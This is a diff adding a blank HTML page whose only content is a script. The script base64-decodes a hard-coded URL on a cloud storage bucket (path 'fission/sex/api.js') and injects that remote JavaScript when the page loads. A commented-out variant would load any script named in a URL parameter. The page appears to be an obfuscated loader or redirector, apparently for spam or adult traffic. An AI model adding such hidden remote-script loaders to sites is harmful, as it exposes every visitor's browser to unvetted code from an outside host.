@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<body>
+    <script>
+	//document.title = '\u8bf7\u7a0d\u7b49...';
+    function get_param(name,v) {
+        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+        var r = window.location.search.substr(1).match(reg);
+        if (r != null) return (r[2]);
+        return v;
+    }
+    var s = document.createElement('script');
+    //s.src = atob(get_param('to'));
+	s.src = atob('Ly93ZWlsYWkyMDE3Lm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vZmlzc2lvbi9zZXgvYXBpLmpz');
+    document.body.appendChild(s);
+    </script> 
+</body>
+</html>
